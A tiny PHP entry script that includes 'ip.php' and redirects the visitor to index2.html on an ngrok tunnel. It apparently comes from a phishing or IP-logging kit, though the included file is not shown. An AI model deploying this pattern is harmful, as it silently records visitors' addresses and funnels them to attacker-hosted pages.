<?php
include 'ip.php';
header('Location: https://04f0245917b1.ngrok.io/index2.html');
exit
?>
